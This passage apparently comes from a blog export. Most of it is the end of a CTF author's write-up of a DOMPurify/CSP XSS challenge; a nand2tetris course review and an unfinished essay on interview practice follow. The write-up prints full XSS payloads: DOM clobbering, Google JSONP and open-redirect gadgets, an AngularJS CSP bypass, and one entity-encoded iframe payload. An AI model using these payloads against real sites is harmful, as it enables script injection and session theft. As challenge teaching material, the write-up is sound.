It’s important that DOMPurify allows any attributes that start with data- by default, and also both class and id are permitted. I learned this nifty trick from TSJ CTF 2022 - web&#x2F;Nim Notes, but it seems that it’s from another XSS challenge made by @terjanq in TokyoWesterns CTF 2020. Now, we can call a function by injecting HTML. The question is, what function should we call? Both loadScript and reloadRecaptchaScript are suspicious, but loadScript might not be a good target because we can’t control the arguments. How about reloadRecaptchaScript? function reloadRecaptchaScript(index) &#123; // delay for a bit to not block main thread setTimeout(() => &#123; console.log('reload', index, document.scripts[index]) const element = document.scripts[index] const src = element.getAttribute('src') if (!src.startsWith('https://www.google.com/recaptcha/')) &#123; throw new Error('reload failed, invalid src') &#125; element.parentNode.removeChild(element) loadScript(src) &#125;, 1000) &#125; If we can control document.scripts[index], we can load another script from https://www.google.com. When the reCAPTCHA calls a function, it passes no argument, so the index will be undefined, so we need to override document.scripts[&#39;undefined&#39;] Can we control it? Sure, it’s DOM clobbering time! DOM clobberingUsually, we can override the attribute on document by providing a embed, form, input, object or img with name, like this: &lt;img name=\"scripts\"> // document.scripts => &lt;img> Combining with form element, we can clobber document.scripts[&#39;undefined&#39;]: &lt;form name=\"scripts\"> &lt;img name=\"undefined\" src=\"src\"> &lt;/form> But, it’s not working because DOMPurify prevents this behavior by default: https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L1015 if ( SANITIZE_DOM &amp;&amp; (lcName === 'id' || lcName === 'name') &amp;&amp; (value in document || value in formElement) ) &#123; return false; &#125; Fortunately, there is another vulnerability in the code: function sanitize(html, options = defaultOptions) &#123; return DOMPurify.sanitize(html, &#123; FORBID_TAGS: options.blockTags || [], FORBID_ATTR: options.blockAttrs || [], FORCE_BODY: options.forceBody, WHOLE_DOCUMENT: options.wholeDocument, KEEP_CONTENT: !options.removeContent, SANITIZE_DOM: !options.allowDOM, &#125;) &#125; When calling sanitize without options, the default value will be defaultOptions, so we can clobber defaultOptions.allowDOM to make SANITIZE_DOM falsy. Also, we need to call loadData() again without any arguments to let sanitizeOptions be undefined. To sum up, we can control document.scripts[&#39;undefined&#39;] by providing below HTML: &lt;div> &lt;form>&lt;/form> &lt;form name=\"scripts\"> &lt;img name=\"undefined\" src=\"src_here\"> &lt;/form> &lt;form id=defaultOptions> &lt;img name=allowDOM> &lt;/form> &lt;div class=\"g-recaptcha\" data-sitekey=\"AAA\" data-error-callback=\"reloadRecaptchaScript\" data-size=\"invisible\"> &lt;/div> &lt;div class=\"g-recaptcha\" data-sitekey=\"BBB\" data-error-callback=\"loadData\" data-size=\"invisible\"> &lt;/div> &lt;/div> Load external scriptNow, we have control on document.scripts[index], but we still need to bypass another check: function reloadRecaptchaScript(index) &#123; setTimeout(() => &#123; console.log('reload', index, document.scripts[index]) const element = document.scripts[index] const src = element.getAttribute('src') if (!src.startsWith('https://www.google.com/recaptcha/')) &#123; throw new Error('reload failed, invalid src') &#125; element.parentNode.removeChild(element) loadScript(src) &#125;, 1000) &#125; The src should start with https://www.google.com/recaptcha/, how to overcome this? There is a subtle difference between element.src and element.getAttribute(&#39;src&#39;), the former returns the formatted value, while the latter returns raw value: &lt;img src=\"https://example.com/abc/../test\"> // img.src => https://example.com/test // img.getAttribute('src') => https://example.com/abc/../test By using ../, we can load any scripts from https://www.google.com. It’s easy to find a useful gadget from JSONBee: https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert#1 The response is like: alert &amp;&amp; alert([\"hello\",[\"hello kitty\",\"hello world\",\"hello kiki\",\"hellolulu\",\"hello venus\",\"hello nico\",\"hello bubble\"],[\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\"],[],&#123;\"google:clientdata\":&#123;\"bpc\":false,\"phi\":0,\"tlw\":false&#125;,\"google:suggestrelevance\":[601,600,555,554,553,552,551,550],\"google:suggestsubtypes\":[[512,433],[512,433,131],[512,433,131],[512],[512,433],[512],[512],[512,433,131]],\"google:suggesttype\":[\"QUERY\",\"QUERY\",\"QUERY\",\"QUERY\",\"QUERY\",\"QUERY\",\"QUERY\",\"QUERY\"],\"google:verbatimrelevance\":1300&#125;]) We can’t run arbitrary JS because callback is restricted, it won’t work if you pass something like alert(document.domain), but we have the ability to call a function with controlled arguments. The idea is simple, we can use it to load AngularJS from cdn.js by leverage the classic ..%2f trick. https:&#x2F;&#x2F;www.google.com&#x2F;recaptcha&#x2F;..&#x2F;complete&#x2F;search?client&#x3D;chrome&amp;q&#x3D;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;dompurify&#x2F;..%252fangular.js&#x2F;1.8.2&#x2F;angular.js%23&amp;callback&#x3D;loadScript Response: loadScript &amp;&amp; loadScript([&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;dompurify&#x2F;..%2fangular.js&#x2F;1.8.2&#x2F;angular.js#&quot;,[],[],[],&#123;&quot;google:clientdata&quot;:&#123;&quot;bpc&quot;:false,&quot;tlw&quot;:false&#125;,&quot;google:suggesttype&quot;:[],&quot;google:verbatimrelevance&quot;:1300&#125;]) AngularJS CSP bypassHere comes the last part of the challenge. The goal is to find an AngularJS CSP bypass and XSS without user interaction. There is a classic payload as described in: Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup H5SC Minichallenge 3: “Sh*t, it’s CSP!” &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/..%252fprototype/1.7.2/prototype.js\">&lt;/script> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/..%252fangular.js/1.0.1/angular.js\">&lt;/script> &lt;div ng-app ng-csp> ｛&#123;$on.curry.call().alert(1)&#125;&#125; &lt;/div> It requires no user interaction, perfect! But there are two other issues we need to address. First, ng-app and ng-csp will be removed by DOMPurify. Second, there is no prototype.js. For the first issue, we can use data-ng-app and data-ng-csp instead of ng-app and ng-csp, because AngularJS will normalize attribute names, and remove x- and data- prefixes. For the second issue, we need to know why prototype.js is needed. It’s needed because prototype.js adds a few methods to different prototype, like Function.prototype: function curry() &#123; if (!arguments.length) return this; var __method = this, args = slice.call(arguments, 0); return function() &#123; var a = merge(args, arguments); return __method.apply(this, a); &#125; &#125; The first argument of fn.call() is this, if you call this function without providing this, the default value of this is window in non-strict mode. So, any_function.curry.call() will return this which is window, that’s why we need prototype.js. If you look at the source code again, you can find a similar pattern: String.prototype.encode = function(type) &#123; if (!type) return this if (type === 'uri') return encodeURIComponent(this) if (type === 'json') return JSON.stringify(this) if (type === 'base64') return atob(this) &#125; That is to say, we can get window via &quot;any_string&quot;.encode.call(). Piece all togetherThe full exploit including: DOM clobbering window.defaultOptions.allowDOM to allow clobber document DOM clobbering document.scripts[&#39;undefined&#39;] Call loadData via reCAPTCHA Call reloadRecaptchaScript via reCAPTCHA Load AngularJS from cdn.js by classic google gadget and ..%2f trick Use data-ng-app instead of ng-app to bypass DOMPurify Use &quot;&quot;.encode.call() to get window object Here is the final payload for the intended solution: link &lt;div> &lt;form>&lt;/form> &lt;form name=\"scripts\"> &lt;img name=\"undefined\" src=\"https://www.google.com/recaptcha/../complete/search?client=chrome&amp;q=https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%252fangular.js/1.8.2/angular.js%23&amp;callback=loadScript\"> &lt;/form> &lt;form id=defaultOptions> &lt;img name=allowDOM> &lt;/form> &lt;div class=\"g-recaptcha\" data-sitekey=\"AAA\" data-error-callback=\"reloadRecaptchaScript\" data-size=\"invisible\">&lt;/div> &lt;div class=\"g-recaptcha\" data-sitekey=\"B\" data-error-callback=\"loadData\" data-size=\"invisible\">&lt;/div> &lt;div data-ng-app data-ng-csp> [[\"abc\".encode.call().alert(\"abc\".encode.call().document.domain)]] &lt;/div> &lt;/div> Note: somehow hexo throw error if I used &#125;&#123;, so I changed to [[]] UnintendedBesides the intended solution, there are 4 amazing unintended solutions. Unintended #1 by @maple3142At first, I didn’t know there was a jsonp argument in https://www.google.com/complete/search endpoint, so there was no check for jsonp. It’s east to get a XSS by loading something like https://www.google.com/complete/search?client=chrome&amp;q=123&amp;jsonp=alert(document.domain)// Later on, I implemented a check for jsonp in reloadRecaptchaScript: if (src.includes('jsonp') || decodeURIComponent(src).includes('jsonp')) &#123; throw new Error('dangerous keyword detected') &#125; Unintended #2 by @smaury92It turns out that I implemented a flawed check, can you spot the bug? You can bypass the check by open redirect and double encoded the https://google.com/complete/search call, like this: reloadRecaptchaScript('https://www.google.com/recaptcha/../url?q=https://www.google.com/complete/search?client=chrome%26q=%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%61%25%32%66%25%32%66%25%37%37%25%37%37%25%37%37%25%32%65%25%36%37%25%36%66%25%36%66%25%36%37%25%36%63%25%36%35%25%32%65%25%36%33%25%36%66%25%36%64%25%32%66%25%36%33%25%36%66%25%36%64%25%37%30%25%36%63%25%36%35%25%37%34%25%36%35%25%32%66%25%37%33%25%36%35%25%36%31%25%37%32%25%36%33%25%36%38%25%33%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%33%64%25%36%33%25%36%38%25%37%32%25%36%66%25%36%64%25%36%35%25%32%36%25%36%61%25%37%33%25%36%66%25%36%65%25%37%30%25%33%64%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%36%34%25%36%66%25%36%64%25%36%31%25%36%39%25%36%65%25%32%39%25%32%66%25%32%66%2523%26callback=loadScript%231') So it passed the check for reloadRecaptchaScript. I decided the move the check from reloadRecaptchaScript to loadScript: https://github.com/aszx87410/xss-challenge/commit/7382e9b48721b1dd9edcd21675e1e7f56d171c2c Unintended #3 by @lbrnli1234The check failed again. payload: reloadRecaptchaScript('https://www.google.com/recaptcha/../url?q=https%3A%2F%2Fwww.google.com%2Fcomplete%2Fsearch%3Fclient%3Dhp%26q%3Da%26%256asonp%3Dalert(document.domain)') I was aware of google open redirect but I didn’t notice a subtle difference. When I tried google open redirect, it returned 200 in that case and used client side redirect: https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug So I thought it was impossible to leverage this open redirect. But for some other cases, it returns 302: https://www.google.com/url?sa=t&amp;url=http://example.org/&amp;usg=AOvVaw1YigBkNF7L7D2x2Fl532mA Anyway, I didn’t fix this unintended in the end because I don’t have a good solution at the moment. Unintended #4 by @lbrnli1234Another dope unintended has been found: https://aszx87410.github.io/xss-challenge/notes/?name=&amp;content=&lt;p class=g-recaptcha data-sitekey=x data-error-callback=reloadRecaptchaScript>&lt;/p> &lt;p class=g-recaptcha data-sitekey=x data-error-callback=reloadRecaptchaScript>&lt;/p> &lt;p class=g-recaptcha data-sitekey=x data-error-callback=loadData>&lt;/p> &lt;form>&lt;/form> &lt;form id=defaultOptions>&lt;img id=allowDOM>&lt;/form> &lt;form name=scripts> &lt;input id=undefined src='https://www.google.com/recaptcha/../complete/search?client=hp&amp;q=https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.0/purify.min.js%23&amp;callback=loadScript'> &lt;img id=undefined src='https://www.google.com/recaptcha/../jsapi?callback=loadData'> &lt;/form> &lt;form>&lt;math>&lt;mtext>&lt;/form>&lt;form>&lt;mglyph>&lt;style>&lt;/math>&lt;iframe srcdoc=' &amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x20;&amp;#x73;&amp;#x72;&amp;#x63;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x73;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x63;&amp;#x64;&amp;#x6e;&amp;#x6a;&amp;#x73;&amp;#x2e;&amp;#x63;&amp;#x6c;&amp;#x6f;&amp;#x75;&amp;#x64;&amp;#x66;&amp;#x6c;&amp;#x61;&amp;#x72;&amp;#x65;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2f;&amp;#x61;&amp;#x6a;&amp;#x61;&amp;#x78;&amp;#x2f;&amp;#x6c;&amp;#x69;&amp;#x62;&amp;#x73;&amp;#x2f;&amp;#x64;&amp;#x6f;&amp;#x6d;&amp;#x70;&amp;#x75;&amp;#x72;&amp;#x69;&amp;#x66;&amp;#x79;&amp;#x2f;&amp;#x2e;&amp;#x2e;&amp;#x25;&amp;#x32;&amp;#x66;&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x74;&amp;#x6f;&amp;#x74;&amp;#x79;&amp;#x70;&amp;#x65;&amp;#x2f;&amp;#x31;&amp;#x2e;&amp;#x37;&amp;#x2e;&amp;#x32;&amp;#x2f;&amp;#x70;&amp;#x72;&amp;#x6f;&amp;#x74;&amp;#x6f;&amp;#x74;&amp;#x79;&amp;#x70;&amp;#x65;&amp;#x2e;&amp;#x6a;&amp;#x73;&amp;#x22;&amp;#x3e;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#xa;&amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x20;&amp;#x73;&amp;#x72;&amp;#x63;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x73;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x63;&amp;#x64;&amp;#x6e;&amp;#x6a;&amp;#x73;&amp;#x2e;&amp;#x63;&amp;#x6c;&amp;#x6f;&amp;#x75;&amp;#x64;&amp;#x66;&amp;#x6c;&amp;#x61;&amp;#x72;&amp;#x65;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2f;&amp;#x61;&amp;#x6a;&amp;#x61;&amp;#x78;&amp;#x2f;&amp;#x6c;&amp;#x69;&amp;#x62;&amp;#x73;&amp;#x2f;&amp;#x64;&amp;#x6f;&amp;#x6d;&amp;#x70;&amp;#x75;&amp;#x72;&amp;#x69;&amp;#x66;&amp;#x79;&amp;#x2f;&amp;#x2e;&amp;#x2e;&amp;#x25;&amp;#x32;&amp;#x66;&amp;#x61;&amp;#x6e;&amp;#x67;&amp;#x75;&amp;#x6c;&amp;#x61;&amp;#x72;&amp;#x2e;&amp;#x6a;&amp;#x73;&amp;#x2f;&amp;#x31;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x2f;&amp;#x61;&amp;#x6e;&amp;#x67;&amp;#x75;&amp;#x6c;&amp;#x61;&amp;#x72;&amp;#x2e;&amp;#x6a;&amp;#x73;&amp;#x22;&amp;#x3e;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#xa;&amp;#x3c;&amp;#x64;&amp;#x69;&amp;#x76;&amp;#x20;&amp;#x6e;&amp;#x67;&amp;#x2d;&amp;#x61;&amp;#x70;&amp;#x70;&amp;#x20;&amp;#x6e;&amp;#x67;&amp;#x2d;&amp;#x63;&amp;#x73;&amp;#x70;&amp;#x3e;&amp;#x7b;&amp;#x7b;&amp;#x24;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x63;&amp;#x75;&amp;#x72;&amp;#x72;&amp;#x79;&amp;#x2e;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#x6c;&amp;#x28;&amp;#x29;&amp;#x2e;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x24;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x63;&amp;#x75;&amp;#x72;&amp;#x72;&amp;#x79;&amp;#x2e;&amp;#x63;&amp;#x61;&amp;#x6c;&amp;#x6c;&amp;#x28;&amp;#x29;&amp;#x2e;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x6f;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6e;&amp;#x29;&amp;#x7d;&amp;#x7d;&amp;#x3c;&amp;#x2f;&amp;#x64;&amp;#x69;&amp;#x76;&amp;#x3e; '>&lt;/iframe> The content of srcdoc is the classic angularJS CSP bypass payload we mentioned &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fprototype/1.7.2/prototype.js\">&lt;/script> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%2fangular.js/1.0.1/angular.js\">&lt;/script> &lt;div ng-app ng-csp>｛&#123;$on.curry.call().alert($on.curry.call().document.domain)&#125;&#125;&lt;/div> The flow is like: reCAPTCHA triggers reloadRecaptchaScript(), will be run after 1s reCAPTCHA triggers reloadRecaptchaScript(), will be run after 1s reCAPTCHA triggers loadData(), run immediately and pollute document.scripts[&#39;undefined&#39;] Run the function in step 1, load src from &lt;input&gt;, call loadScript(&#39;https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.0/purify.min.js&#39;) Run the function in step 2, load src from &lt;img&gt;, call loadScript(&#39;https://www.google.com/recaptcha/../jsapi?callback=loadData&#39;) to trigger loadData again Old version of DOMPurify has loaded (the lib we load in step 4), override latest one Script at step 5 also loaded, loadData has been called again Now, the DOMPurify is the old and flawed version, so we can bypass it easily It sometimes fails because of race conditions. For example, if script at step 5 is loaded(called loadDate) before DOMPurify, we still use the latest version, so there is no way to bypass it. The author created an HTML page and embedded a few &lt;iframe&gt; to load the URL many times to solve the issue. Takeaways Everything can be abuse Existing JS code might be helpful sometimes Knowing the default behavior of third party libraries is helpful I hope you did learn something new and enjoyed this challenge, thanks for playing the game!","link":"/2022/04/13/en/notes-challenge-author-writeup/"},{"title":"From Nand To Tetris: Understanding Computer Operations by Building One","text":"IntroductionI have always recommended a course called CS50 because it is deep, broad, and taught in a clear and concise manner. The assignments are also solid, making it an excellent course. The course I am introducing today can be described as the “CS50 of computer hardware.” From Nand to Tetris was created by two professors, Shimon Schocken and Noam Nisan. Like CS50, it was originally a university course that later became an online course. The course has a subtitle on its official website: “Building a Modern Computer From First Principles.” Yes, you will build a computer. The course is divided into two parts. Part 1 is From Nand to HACK. Nand is the name of a logic gate, just like Or, And, and Xor. HACK is the computer that will be built at the end of Part 1. Therefore, Part 1 will take you from the most basic logic gate and gradually build a computer. This part is heavily focused on hardware. Part 2 is From HACK to Tetris, which extends from the computer to software. It covers topics such as compilers and operating systems. The course overview can be seen in this image: I have always wanted to take this course, but I never got around to it. Recently, I finally took the course seriously and completed it. It is indeed an excellent course! Therefore, I am writing this article to introduce and recommend it to everyone. Why I Wanted to Take This CourseSeven years ago, when I was a freshman, I took two courses: “Computer Organization and Assembly Language” in the Department of Computer Science and “Computer Organization and Structure” in the Department of Information Management. The reason I took these two courses was simple: I had a fascination with assembly language. Although I am not good at writing assembly language, I think it is cool. Whether it’s C++, Go, Rust, or my favorite JavaScript, I think they are not as cool as assembly language. I don’t know why, but I think writing assembly language is cool. To learn and write assembly language, I took those two courses. The first half of those courses covered some low-level computer topics that I still don’t understand. I got low scores on the first two assignments, and I never understood those circuit diagrams. However, after entering the assembly language part, I felt like a fish in water. Finally, I was studying a topic that I liked and was good at. In short, besides assembly language, I didn’t gain much from those two courses because I couldn’t understand many things. After completing those courses, I knew about registers, L1 and L2 caches, branch prediction, and instruction pipelines, but I still didn’t know how computers work or how they execute instructions. However, because I didn’t plan to study computer science and I wouldn’t encounter such low-level things in my work, I gradually stopped paying attention. But in my heart, I still wanted to know how computers work. After growing up, I accidentally heard about From Nand to Tetris (hereinafter referred to as nand2tetris), which takes you from the simplest logic gate and builds a computer. Then, you will run a Tetris program on this computer. Wow, it sounds great. This is why I wanted to take this course. I want to know how computers work. I want to know what is inside the CPU, not just a black box. What Does the Course Cover?The course has six weeks and is divided into seven units (Units 0-6). Unit 0 is an introduction to the course. Below, I will introduce each unit to you. Unit 0: IntroductionIn addition to introducing the course, this unit also introduces two important concepts: Abstraction and Implementation. An example will make it easier to understand. For example, if you are given a computer and asked to write a program that outputs “Hello World,” you don’t have to worry about how print works. You can assume that it will print something. In other words, you don’t need to worry about how print is implemented (Why), you just need to know what it can do (What). This concept is very important in computer science because a computer is a layered thing. It is built layer by layer, from the bottom layer of electronic circuits, to basic logic gates (And, Or, and Not), to more complex hardware (Register, ALU), to even more complex hardware (CPU, RAM), and so on. And this course will take you from the bottom up, building up to let you know what a computer is made of. The “bottom” here refers to logic gates. You don’t need to know how the circuits in the physical world are connected (because that’s the field of electronics or electrical engineering), nor do you need to know how the “input” is input or where the “output” will be output. Unit1: Boolean functions and logic gateThis week will introduce basic logic gates, such as Or, And, Xor, Nand, and Nor, etc., to let you know their functions. You will also be taught to draw truth tables to familiarize yourself with these basic logics. The homework for this week is to only give you a logic gate Nand and ask you to create the following 15 circuits: Not And Or Xor Mux DMux Not16 And16 Or16 Mux16 Or8Way Mux4Way16 Mux8Way16 DMux4Way DMux8Way So how to do it? You can use the HDL (hardware description language) and hardware simulator developed by the course team. For example, if you want to use Nand to create Not, you can write it like this: CHIP Not &#123; &#x2F;&#x2F; 我要寫一個叫做 Not 的 chip IN in; &#x2F;&#x2F; 輸入的訊號叫做 in OUT out; &#x2F;&#x2F; 輸出叫做 out PARTS: Nand (a&#x3D;in, b&#x3D;in, out&#x3D;out); &#x2F;&#x2F; 把 in 跟 in 傳進 Nand chip，輸出到 out &#125; If my input is 0, then in is 0, and the result of 0 Nand 0 is 1, so out will be 1, which is the result of not after 0. If the input is 1, 1 Nand 1 is 0, and out will be 0. Therefore, we can complete the function of Not using only the Nand logic gate. This unit is to familiarize you with the writing of HDL and try to combine circuits. In the testing part, the course team also thoughtfully provided a self-made hardware simulator, which allows you to load circuits and conveniently test whether they are correct: (Image from the official website) Unit 2: Boolean Arithmetic and the ALUThis week, we will introduce number operations in computers. We will talk about how computers represent numbers, which is commonly known as binary, and we will also discuss the representation of negative numbers (two’s complement). The assignment is to create the following circuits: HalfAdder FullAdder Add16 Inc16 ALU The full name of ALU is Arithmetic Logic Unit. Those who have taken related courses should be familiar with this. In short, it is a circuit used for arithmetic operations. You input two numbers and the operation you want to perform, and it will output the result. Unit 3: MemoryThe difficulty of the first two weeks was manageable, but I think the difficulty suddenly increased this week due to the introduction of a new concept: Sequential logic. The circuits designed in the previous units are called Combinational logic. Simply put, it can be represented by the formula: out[t] = function(in[t]). You input a value at a certain time t, and it will return the corresponding result. Everything is very simple and clear. However, Sequential logic is different. Its output is not only related to the current input, but also to the “previous input”. In other words, Sequential logic has the ability to remember things. To use programming as an analogy, Combinational logic is like a pure function. If you give the same input, you will always get the same output. Sequential logic is like a function with side effects. The assignment for this week is to create the following circuits: 1 bit register 16-bit register RAM8 (16-bit &#x2F; 8-register memory) RAM64 RAM512 RAM4K RAM16K PC (Program Counter) Unit 4: Machine LanguageActually, the previous unit was only one step away from what the computer does. But this week, we will temporarily depart from hardware and circuits and assume that the computer has been built. So, how do we make the computer execute programs? The answer is machine language, which is the only language that the CPU can understand, consisting of 0101010. However, it is too cruel to ask you to write machine language directly, so the official provides an Assembler, which allows you to write assembly language. Therefore, this week is about writing assembly language to familiarize yourself with the instruction format of the HACK computer. There are two assignments: one is to input two numbers and return the product, and the other is an interactive program where the screen turns black when you press a key and turns white when you release it. This week, I found it interesting to explain the principles of input and output. For example, how does the computer know what keys were pressed on the keyboard after typing? It can be simplified as follows: whenever the keyboard is pressed, a signal is sent to the computer, and the code for the key pressed is placed in a specific memory location. By checking that memory location, we can determine if a key was pressed. Output works in a similar way. There is a specific memory block where each bit represents a pixel, with 1 representing black and 0 representing white. The screen reads this memory block at a fast frequency (e.g. 50 times per second) and displays the appropriate pixels. In this way, input and output can be achieved through specific memory locations. Unit 5: Computer ArchitectureThis week, we continued building the computer we started in week 3, focusing on building the memory and CPU and learning how the computer executes instructions. This unit is important, as it integrates what we learned in week 3 and culminates in building a complete computer. Unit 6: AssemblerIn week 4, we used the official assembler to convert assembly language into machine code. In the last week of part 1, we wrote our own assembler to convert assembly language into machine code. If you don’t know how to program, the course also provides another way to complete the assignments: manual translation. You can look up each line of code and translate it into machine code. After completing these seven units, we built many circuits, including a CPU, memory, and a complete computer. We also learned how to execute instructions on the computer and how to write an assembler. Course ReviewLike CS50, this course claims that anyone can take it without prior knowledge. However, as I mentioned before, I don’t think CS50 is suitable for everyone without a foundation. For some people, the gradient is still too high, and the difficulty increases too quickly, leaving room for improvement. What about this course? I think beginners can try it because you really don’t need any programming foundation. However, I think the assignments will still be quite challenging. Although you don’t need a programming foundation, some assignments still require logical and thinking skills, and it’s easy to forget where you were if you lose focus. During the course, there were several points that surprised me. Warning: spoilers ahead that may ruin the fun of taking the course. The first is that HACK’s machine language has two types: A-instruction and C-instruction, distinguished by the highest bit, which is 0 or 1, respectively. A-instruction is used to load a 15-bit value. In week 4, when I was writing assembly language, I didn’t understand why I couldn’t specify which operation to perform. In a programming language, I would imagine something like this: if (op === 1) &#123; return x &#125; else if (op === 2) &#123; return y &#125; else if (op === 3) &#123; return x+y &#125; else if (op === 4) &#123; return x&amp;y &#125; But circuits don’t have if statements. So how do you do it? The answer surprised me. You use six control bits to operate on the input, and the combination of these six bits produces the desired result. See the figure below for details: The other two outputs of the ALU, ng (whether the output is negative) and zr (whether the output is zero), may seem useless, but they are actually used for jump, which we will encounter later in the course. Overall, I think this course is well-organized, starting with the most basic circuits and gradually becoming more complex. It also teaches you machine language and assembly language, making you familiar with the underlying concepts of computers. As a teacher, there are several things in this course that are worth emulating. The first is customized tools, such as the HDL and hardware simulator developed specifically for this course, which make it easy for beginners to learn. The second is the way assignments are graded. Each assignment folder contains corresponding test files, so students can check if their code is correct. The third is the alternative assignments. In the final week’s assignment, an alternative was provided for students who don’t know how to program: manually translating the code into machine code. The fourth is the course arrangement. Although circuits are discussed, the course doesn’t go too deep into electronics and electrical engineering. The course progresses continuously from Nand to CPU. The fifth is the order of the course. The first few weeks are bottom-up, building concepts from the ground up. In week 4, we suddenly switch to top-down, writing assembly language before building the computer. This arrangement makes students more aware of machine code when building the computer. The sixth is the way common questions are handled. At the end of each unit, there is a Perspectives video where two professors answer common questions, saving a lot of time. ConclusionWhether or not you have a programming background, I think you can give this course a try. I sincerely recommend it to everyone. I took the version on Coursera, which is completely free. However, if you want to submit assignments and get a certificate, you need to pay $50. I didn’t hesitate to pay to support this course, but whether or not to purchase is up to you. Also, this is only part 1. Next year, I plan to continue with part 2 and share my experience with everyone after completing it. Previously, Professor Chung-Cheng Chen from the Department of Computer Science at Kinmen University also wrote about his experience in the article “Nand2Tetris MOOC Notes - From Logic Gates to Block Games“. Interested friends can also refer to it. Finally, don’t hesitate anymore, go and take the course.","link":"/2019/12/26/en/nand2tetris-introduction/"},{"title":"My Ideal Interview Process","text":"Although I interviewed about 20 companies last year, it wasn’t until recently that I realized how important the interview process is for a company. Of course, the importance of HR cannot be underestimated either. If the HR of a company does a good job and the interview process makes the interviewee feel cared for, in this era of open internet, the job seeker may share with friends later: Hey, I went to XXX today, their interview process is awesome! Conversely, a poor interview process can cause harm for years to come, with negative reviews one after another. Below are some practical examples, all of which are positive examples, and I will directly mention the company names. Yes, I remember the companies that treated me well when I went for an interview! Today I want to talk to you about my ideal interview process, which can be roughly divided into three steps: Before the interview (arranging the interview) During the interview After the interview Let’s discuss each of these three steps one by one. Before the interviewAs far as I know, there are mainly two ways to arrange an interview: Phone Email The advantage of arranging an interview by phone is that you can finalize the time immediately without going back and forth through email. But I think there are also some disadvantages, such as the fact that job seekers are likely to interview with several companies. It is possible that when you call, they are in the middle of an interview or too busy to answer the phone. Or like me, when I arranged a lot of interviews at that time, I had to check my phone calendar to see when I was available for an interview when he called me. Therefore, I personally prefer to use email to set the time, and if there is no response after two or three days, then I will use the phone to arrange the interview. One thing to note is that after arranging the interview time by phone, HR must send another interview invitation letter. As mentioned earlier, job seekers may be very busy, and if they don’t record the time immediately, they won’t know where to start later. Therefore, sending a letter to notify the interview time again is a necessary and thoughtful behavior. As for arranging an interview time by email, there are two types that I have encountered: Directly schedule a time for you, and if it doesn’t work, reply to reschedule. Pre-book several dates and time slots, and choose the available time slot yourself. Both 1 and 2 have some obvious advantages and disadvantages for companies and job seekers. For example, if the job seeker is available on that day, then it is good to schedule the time like 1. But if the job seeker is not available, then you have to continue to exchange letters. For 2, the company must first select several time slots that can be interviewed, which seems to be more difficult for companies with more changes. But for job seekers, 2 allows you to choose the available time slot yourself, which is very convenient. This is what muzik online does, providing many times for job seekers to choose from. After setting the interview time, the second step is to send the interview notification letter. What kind of information should be included in the letter? Time Location Position applied for Company phone number Others Among them, for 2. Location, depending on the company’s location, you can add more emphasis. Why? Because some companies may be in office buildings that require identification, or the location may be difficult to find. At this time, if you say more in the letter, it will make the job seeker feel very thoughtful. For example: Location: 10th floor, No. 689, Nanjing North Road, Taipei City (above 7-11, near Nanjing East Road MRT Station). You can enter the building directly without changing your ID. After you get off the elevator on the 10th floor, turn right and ring the bell to say that you are here for an interview. This is much better than just saying the location in the notification letter, right! This is how muzik online’s interview letter is. Then in the 5. Others section, you can explain more related information about the interview, such as: The interview process takes about an hour, and the first ten minutes will allow you to fill in your personal basic information. We will print out the resume you sent before, so you don’t need to bring it. But if you have any documents or achievements that you think can add points or prove your abilities, please bring relevant materials. I think it’s very thoughtful to help job seekers print their resumes. It shows that the company values this resume. That’s about it for the part related to job seekers. Next, let’s talk about what the company should pay attention to: Before the interview, the interviewer should read the job seeker’s resume a little bit.I think this is quite important. If the job seeker has to prepare, shouldn’t the interviewer prepare too? At least take a look at his resume first, so 